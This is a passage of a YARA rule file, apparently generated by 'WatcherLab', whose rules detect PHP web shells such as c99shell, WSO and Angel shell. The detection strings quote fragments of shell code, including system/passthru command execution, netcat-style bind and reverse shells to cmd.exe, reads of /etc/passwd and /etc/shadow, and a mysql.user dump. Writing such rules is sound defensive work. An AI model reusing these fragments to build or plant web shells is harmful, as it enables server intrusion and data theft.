      $s19 = "Hd0dne0QX/BnLKiEB8HY0tvYf0IuU1+J8IpqWxf3+eQiKc8hbrtowSjf39Aow28mPqz0B/Y/P+7EaA8f1vMfKEQqF6JHMpelNofipKEypaGPx1ERUWNVZSU0ICrQmVAY" ascii
      $s20 = "YGIuyBC7GqWZCQG5+iE4ch/Q3pC42KoQm45KMQQqoRFZJc2skunjLLIGQoskxaSETDsUFU1Qg7obKWUEU9TXRIp6vn6T3i7QV8qayeuqSj47nAtJy31y8ufD77zcom3g" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0353ab4cbed5beae847a7ff6e220b5cf_0771fc6f0f4b1d7d1bb73bbbe14e0e31_56
{
   meta:
      description = "php17 - from files 0353ab4cbed5beae847a7ff6e220b5cf.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash2 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
   strings:
      $x1 = "else {$tmp = htmlspecialchars(\"./dump_\".$SERVER_NAME.\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x2 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x3 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = true;}}" fullword ascii
      $s4 = "elseif (is_callable(\"passthru\")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}" fullword ascii
      $s5 = "elseif (is_callable(\"system\")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}" fullword ascii
      $s6 = "echo \"<b>Connected to \".$SERVER_NAME.\" with login \\\"\".$str[0].\"\\\" and password \\\"\".$str[0].\"\\\"</b><br>\";" fullword ascii
      $s7 = "if ($fqb_onlywithsh) {$true = (!in_array($sh,array(\"/bin/false\",\"/sbin/nologin\")));}" fullword ascii
      $s8 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&f=accou" ascii
      $s9 = "elseif (empty($login_txt)) {$login_txt = strip_tags(ereg_replace(\"&nbsp;|<br>\",\" \",$donated_html));}" fullword ascii
      $s10 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\".substr(decoct(fileperms($d.$f)),-4,4).\")</b><br>" ascii
      $s11 = "?><b>Binding port:</b><br><form method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"bind\"><input type=\"hidden\" name=" ascii
      $s12 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"act=cmd\\\" method=\\\"POST\\\"><input type=\\\"text\\\" name=\\\"cmd\\\"" ascii
      $s13 = "$accessdeniedmess = \"<a href=\\\"http://ccteam.ru/releases/c99shell\\\">c99shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $s14 = "$data = @file_get_contents($c99sh_updatefurl.\"?version=\".$shver.\"&\");" fullword ascii
      $s15 = "if (($_SERVER[\"PHP_AUTH_USER\"] != $login ) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass))" fullword ascii
      $s16 = "elseif ($ft == \"ini\") {echo \"<pre>\"; var_dump(parse_ini_file($d.$f,true)); echo \"</pre>\";}" fullword ascii
      $s17 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"act=cmd\\\" method=\\\"POST\\\"><input type=\\\"text\\\" name=\\\"cmd\\\"" ascii
      $s18 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>act=cmd\" method=\"PO" ascii
      $s19 = "else {$tmpdir = getenv(\"SystemRoot\");}" fullword ascii
      $s20 = "elseif (fsockopen($SERVER_ADDR,$bind[\"port\"],$errno,$errstr,0.1)) {echo \"Port alredy in use, select any other!<br>\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _35b0448cd3e328b11521ab053ea0c99694119b82_7e4723914113dcea43f5c7fe31576b45ab97bd12_a2baa41f5667eb2a3ad57003105e57ed0000af38_57
{
   meta:
      description = "php17 - from files 35b0448cd3e328b11521ab053ea0c99694119b82.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash2 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash3 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $x1 = "<input type='submit' value='fakenamegenerator.com' onclick=\\\"document.hf.action='http://www.fakenamegenerator.com/';" fullword ascii
      $x2 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $x3 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $x4 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x5 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x6 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x7 = "'<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname" ascii
      $x8 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x9 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s10 = "<input type='submit' value='fopo.com.ar' onclick=\\\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\\\"><br>" fullword ascii
      $s11 = "<input type='submit' value='toolki.com' onclick=\\\"document.hf.action='http://toolki.com/';document.hf.submit()\\\"><br>" fullword ascii
      $s12 = "type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=ch" fullword ascii
      $s13 = "lse{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><label><select name=alias>';" fullword ascii
      $s14 = "showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/" fullword ascii
      $s15 = "showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/" fullword ascii
      $s16 = "TP_HOST'] . \" - WSO \" . VERSION .\"</title>" fullword ascii
      $s17 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s18 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s19 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s20 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _15e31a66891cbd2c55427678d32f149faf39a0ce_7a7bfc69b9ab20f960e43c8c4faa4bc33825c648_a9f6388eac0eaa83fb918cec6a54a073818c7682_58
{
   meta:
      description = "php17 - from files 15e31a66891cbd2c55427678d32f149faf39a0ce.php, 7a7bfc69b9ab20f960e43c8c4faa4bc33825c648.php, a9f6388eac0eaa83fb918cec6a54a073818c7682.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "734eb849b064304217773d4ecc46c8d9fcd611bdf3c011acfa3da38c208a272c"
      hash2 = "6989ebb66bf879f3fa7140e847decc7d3d415f5000bf6759f6e6612726619d6c"
      hash3 = "ef6dd73e7cc055e1bd6e1618fbfc44f0043e15a6f2206d0c43f6f4b13646e569"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $s3 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $s4 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $s5 = "if($_REQUEST['fpassw']==$login_password)setcookie('passw',md5($_REQUEST['fpassw']));" fullword ascii
      $s6 = "spliturL($_REQUEST['target'],$host,$page);" fullword ascii
      $s7 = "elseif(!empty($_REQUEST['rport']) && ($_REQUEST['rport']<=65535) && ($_REQUEST['rport']>=1) && !empty($_REQUEST['ip'])){" fullword ascii
      $s8 = "if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){" fullword ascii
      $s9 = "header(\"Content-disposition: attachment; filename=\\\"$dl\\\";\");" fullword ascii
      $s10 = "fputs($sock,\"$b LOGIN $username $password\\r\\n\");" fullword ascii
      $s11 = "tr($_REQUEST['target'],0,strpos($_REQUEST['target'],'?'));}" fullword ascii
      $s12 = "if($fo || $fo=='on')$con=file_get_contents($get);" fullword ascii
      $s13 = "cal/','/htbin/','/cgibin/','/cgis/','/scripts/','/cgi-win/','/fcgi-bin/','/cgi-exe/','/cgi-home/','/cgi-perl/');" fullword ascii
      $s14 = "$res=snmpchecK($target,$com,2);" fullword ascii
      $s15 = "$nuke=array('/','/postnuke/','/postnuke/html/','/modules/','/phpBB/','/forum/');" fullword ascii
      $s16 = "move_uploaded_file($_FILES['uploadfile']['tmp_name'],$_FILES['uploadfile']['name']);" fullword ascii
      $s17 = "header(\"Content-length: \".filesize($img));" fullword ascii
      $s18 = "fputs($sock,\"AUTH LOGIN\\r\\n\");" fullword ascii
      $s19 = "function downloadiT($get,$put){" fullword ascii
      $s20 = "function file_get_contents($addr){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_5bdae9780fa349f3b58c475985c13c012897bd61_6417f6b4aa685ba8f0c4a0b836dde05f6ae_59
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, 9735037eae2f73171d007caca31fbfb6467850d5.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash4 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash5 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash6 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
      hash7 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $x1 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x2 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x3 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x4 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x5 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x6 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $s7 = "\"Content-length: \".strlen($spider));header(\"Content-disposition: attachment; filename=\".$inver.\";\");echo $spider;exit;}" fullword ascii
      $s8 = "$result = @$shell->Execute($sql);" fullword ascii
      $s9 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}" fullword ascii
      $s10 = "if(function_exists('exec')){@exec($cmd,$res);$res = join(\"\\n\",$res);}" fullword ascii
      $s11 = ":'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; " fullword ascii
      $s12 = "if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];" fullword ascii
      $s13 = "elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}" fullword ascii
      $s14 = "if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}" fullword ascii
      $s15 = "if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '" fullword ascii
      $s16 = "function Exec_Run($cmd)" fullword ascii
      $s17 = "setcookie('m_spiderhost',$_POST['mhost'],$cookietime);" fullword ascii
      $s18 = "if(i<=4){document.getElementById('string').value = Str[i];}else{document.getElementById('sql').value = Str[i];}" fullword ascii
      $s19 = "setcookie('m_spiderport',$_POST['mport'],$cookietime);" fullword ascii
      $s20 = "if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1b3b19e834d22baa5a95e1e82fe8ebc063b0218c_Antichat_Socks5_Server_v_1_0_60
{
   meta:
      description = "php17 - from files 1b3b19e834d22baa5a95e1e82fe8ebc063b0218c.php, Antichat_Socks5_Server_v_1.0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "acd1ff56bc7fd1d9af77ac9033ae405f1253319db19b9d41b67253d166adee54"
      hash2 = "9d9380b8c2abef1f931848dd4ff2ecfdd2eef855f2c0b5bd9fa09321586ecb3e"
   strings:
      $s1 = "# ftp://ftp.rfc-editor.org/in-notes/rfc1929.txt                                         #" fullword ascii
      $s2 = "# ftp://ftp.rfc-editor.org/in-notes/rfc1928.txt                                         #" fullword ascii
      $s3 = "if(!socket_bind($sock,  \"0.0.0.0\", $settings['PORT']))" fullword ascii
      $s4 = "$blocked_users  = array('127.0.0.2'" fullword ascii
      $s5 = "if(time() - $timeout[$id] > $settings['AUTH_TIMEOUT'])" fullword ascii
      $s6 = "VER.REP_BLOCKED_HOST.\"\\x00\\x01\".$ipport[$id]);" fullword ascii
      $s7 = "#   [+] LOGIN/PASSWORD authorization                      |   z" fullword ascii
      $s8 = "VER.REP_WRONG_COMMAND.\"\\x00\\x01\\x00\"." fullword ascii
      $s9 = "if(($message = getstring($clientsockets[$id], 10)) === CLOSED_SOCKET){" fullword ascii
      $s10 = "if(($message = getstring($clientsockets[$id], 100)) === CLOSED_SOCKET){" fullword ascii
      $s11 = "elseif(ord($reqmessage[$id][1]) === strlen($reqmessage[$id]) - 2){" fullword ascii
      $s12 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword ascii
      $s13 = "socket_getsockname ($clientsockets[$id], $self_addr, $self_port);" fullword ascii
      $s14 = "// Client hosts, which are not supported for working with (banned)" fullword ascii
      $s15 = "&& $settings['PASSWORD'] === substr($reqmessage[$id], $pos+1," fullword ascii
      $s16 = "$host = base_convert(bin2hex($reqmessage[$id][4]), 16, 10).'.'." fullword ascii
      $s17 = "if(ord($reqmessage[$id][1]) > strlen($reqmessage[$id]) - 2)" fullword ascii
      $s18 = "if(time() - $timeout[$id] > $settings['CONNECT_TIMEOUT'])" fullword ascii
      $s19 = "VER.REP_SOCKS_ERROR.\"\\x00\\x01\".$ipport[$id]);" fullword ascii
      $s20 = "// if -1 - no logs" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _061412e4a03c02f9902576ec55ebbe77_7c102999b65267242a29b2b296f2ce992bd23e59_8fc5de50afa2fc1aec819f1780f7cbbd_61
{
   meta:
      description = "php17 - from files 061412e4a03c02f9902576ec55ebbe77.php, 7c102999b65267242a29b2b296f2ce992bd23e59.php, 8fc5de50afa2fc1aec819f1780f7cbbd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "181954bb9bd9f7484ba89cc707c62c9287afacf3312b7932018a44ab4b0cab64"
      hash2 = "41b3f472978109cfb97abbcde05c81bf9085c356e7f890f805e1efd078bdf093"
      hash3 = "b1fe6ac1421c0cb71e8d8657ca10607aaa01d53ab3b022582788b7c85a47f522"
   strings:
      $x1 = "<b style=\"cursor:crosshair\" onclick=\"set_tab('cmd');\">[Execute command]</b> " fullword ascii
      $x2 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword ascii
      $x3 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword ascii
      $s4 = "&nbsp;&nbsp;&nbsp;<form name=\"cmdform\" onsubmit=\"return runcommand(document.cmdform.command.value,'GET');\">" fullword ascii
      $s5 = "//Execute any other command" fullword ascii
      $s6 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword ascii
      $s7 = "if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {" fullword ascii
      $s8 = "'clear','GET'); runcommand ('listdir \".realpath($directory).\"','GET'); \\\">\".$directory.\"</b><br>\";" fullword ascii
      $s9 = "\"&filecontent=\" + encodeURI( document.getElementById(\"area1\").value );" fullword ascii
      $s10 = "function runcommand(urltoopen,action,contenttosend){" fullword ascii
      $s11 = "print \"<b>\".get_current_user().\"~# </b>\". htmlspecialchars($cmd).\"<br>\";" fullword ascii
      $s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST['filecontent']))" fullword ascii
      $s13 = "$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); " fullword ascii
      $s14 = "http_request.setRequestHeader(\"Content-length\", parameters.length);" fullword ascii
      $s15 = "=\\\"runcommand('editfile \".realpath($file).\"','GET');\\\">\".$file.\"</u><br>\";" fullword ascii
      $s16 = "print '&nbsp;<input type=\"button\" value=\"'.$name.'\" onclick=\"'.$execute.'\"><br>';" fullword ascii
      $s17 = "print \"<b>Free:</b> $free / $total MB<br><b>Current path:</b> $path<br><b>Uname -a Output:</b><br>\";" fullword ascii
      $s18 = "print \"Exec: <b><font color=red>Disabled</b></font><br>\";" fullword ascii
      $s19 = "print \"Exec: <b><font color=green>Enabled</b></font><br>\";" fullword ascii
      $s20 = "var poststr = \"filetosave=\" + encodeURI( document.saveform.filetosave.value ) +" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_043c3d7e489c69b48737cc0c92d0f3a2_04edbee5e0a3cee384e464d05969bd89b0d32a52_0e634bcc_62
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 043c3d7e489c69b48737cc0c92d0f3a2.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2008.php, 2009mssql.php, 2011.php, 2011__2_.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, a647275c30e0a1e78903680ea97931aa8cd39118.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash5 = "6e0ea4ea135950956996df7e86fed9c7f7d77ff89aa1843ec5290ab38e638da4"
      hash6 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash7 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash8 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash9 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash10 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash11 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash12 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash13 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
      hash14 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash15 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash16 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash17 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $s1 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
      $s2 = "$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");" fullword ascii
      $s3 = "p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s4 = "m('Database has success backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$path.'</a>');" fullword ascii
      $s5 = "m(q(\"INSERT INTO $tablename ($keystr) VALUES ($valstr)\") ? 'Insert new record of success' : mysql_error());" fullword ascii
      $s6 = "p('<form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\" name=\"mysqlfile\" id=\"mysqlfile\">');" fullword ascii
      $s7 = "$multipage .= $i == $curpage ? $i.' ' : '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.$i.');\">['.$i.']</a> ';" fullword ascii
      $s8 = "$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbhost\\\" name=\\\"dbhost\\\" value=\\\"$dbhost\\\" />\\n\";" fullword ascii
      $s9 = "e=\"uploadfile\" type=\"file\" /> <a href=\"javascript:mysqlfile(\\'mysqlupload\\');\">Upload</a></p>');" fullword ascii
      $s10 = "if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {" fullword ascii
      $s11 = "formhead(array('title'=>'Back Connect'));" fullword ascii
      $s12 = ".($to < $pages ? ' <a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.$pages.');\">Last</a>' : '');" fullword ascii
      $s13 = "p('<p><b>This operation the DB user must has FILE privilege</b></p>');" fullword ascii
      $s14 = "$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbuser\\\" name=\\\"dbuser\\\" value=\\\"$dbuser\\\" />\\n\";" fullword ascii
      $s15 = "$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbpass\\\" name=\\\"dbpass\\\" value=\\\"$dbpass\\\" />\\n\";" fullword ascii
      $s16 = "$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbport\\\" name=\\\"dbport\\\" value=\\\"$dbport\\\" />\\n\";" fullword ascii
      $s17 = "m(q(\"UPDATE $tablename SET $valstr WHERE $where LIMIT 1\") ? 'Record updating' : mysql_error());" fullword ascii
      $s18 = "$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;" fullword ascii
      $s19 = "if(($to - $from) < $page && ($to - $from) < $pages) {" fullword ascii
      $s20 = "$sql_line = str_replace(array(\"\\r\", \"\\n\", \"\\t\"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab8695666_63
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php, AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash4 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash5 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash6 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash7 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash8 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash9 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash10 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash11 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash12 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash13 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash14 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash15 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash16 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash17 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash18 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash19 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash20 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash21 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash22 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
      hash23 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash24 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
